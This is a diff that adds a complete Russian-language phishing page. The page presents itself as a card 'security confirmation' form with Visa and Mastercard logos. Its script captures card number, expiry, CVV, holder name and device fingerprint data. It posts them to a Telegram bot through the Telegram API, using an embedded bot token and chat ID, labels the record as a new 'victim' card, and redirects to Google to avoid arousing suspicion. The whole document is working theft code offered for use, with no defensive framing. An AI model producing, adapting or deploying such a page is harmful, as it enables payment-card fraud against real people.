@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение безопасности</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card-form {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            width: 380px;
+            max-width: 100%;
+        }
+        .card-form h3 {
+            margin-top: 0;
+            text-align: center;
+            color: #333;
+        }
+        .card-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 15px;
+        }
+        .card-form .row {
+            display: flex;
+            gap: 10px;
+        }
+        .card-form .row input {
+            flex: 1;
+        }
+        .card-form button {
+            width: 100%;
+            background: #0070ba;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .card-form button:hover {
+            background: #005fa3;
+        }
+        .logos {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .logos img {
+            height: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card-form">
+        <div class="logos">
+            <!-- Иконки платёжных систем, можно скачать любые -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MC">
+        </div>
+        <h3>Подтверждение платёжных данных</h3>
+        <p style="text-align:center;font-size:14px;color:#555;">Для вашей безопасности мы просим подтвердить данные карты</p>
+        <form id="phishForm">
+            <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="19" required>
+            <div class="row">
+                <input type="text" id="expMonth" placeholder="ММ" maxlength="2" required>
+                <input type="text" id="expYear" placeholder="ГГ" maxlength="2" required>
+                <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
+            </div>
+            <input type="text" id="cardHolder" placeholder="Имя держателя (как на карте)" required>
+            <button type="submit">Подтвердить</button>
+        </form>
+    </div>
+
+    <script>
+        // ===== НАСТРОЙКИ: ВСТАВЬ СЮДА СВОЙ ТОКЕН И CHAT_ID =====
+        const BOT_TOKEN = '8802383503:AAGEyyguUGWCPuuoZstmfHJ3OW4CfzO0VyM'; // заменить на реальный токен бота
+        const CHAT_ID = '7041199351';                // заменить на ваш chat_id (без кавычек если число, можно строкой)
+
+        // Форматирование номера карты (автопробелы)
+        const cardInput = document.getElementById('cardNumber');
+        cardInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let spaced = val.match(/.{1,4}/g);
+            this.value = spaced ? spaced.join(' ') : '';
+        });
+
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const cardNum = cardInput.value.replace(/\s/g, '');
+            const month = document.getElementById('expMonth').value;
+            const year = document.getElementById('expYear').value;
+            const cvv = document.getElementById('cvv').value;
+            const name = document.getElementById('cardHolder').value;
+
+            // Собираем дополнительную информацию о жертве
+            const userData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: window.screen.width + 'x' + window.screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+
+            // Формируем красивое сообщение для Telegram
+            const message = `
+    🔥 НОВАЯ КАРТА ЖЕРТВЫ 🔥
+    💳 Номер: ${cardNum}
+    📅 Срок: ${month}/${year}
+    🔐 CVV: ${cvv}
+    👤 Имя: ${name}
+
+    🖥️ Данные устройства:
+    User-Agent: ${userData.userAgent}
+    Платформа: ${userData.platform}
+    Язык: ${userData.language}
+    Экран: ${userData.screen}
+    Часовой пояс: ${userData.timezone}
+    Время: ${userData.timestamp}
+            `.trim();
+
+            // Отправляем через Telegram API
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Sent:', data);
+                // Редирект после отправки на легитимный сайт
+                window.location.replace('https://www.google.com');
+            })
+            .catch(err => {
+                console.error('Error:', err);
+                // Даже при ошибке редиректим, чтобы не вызывать подозрений
+                window.location.replace('https://www.google.com');
+            });
+        });
+    </script>
+</body>
+</html>
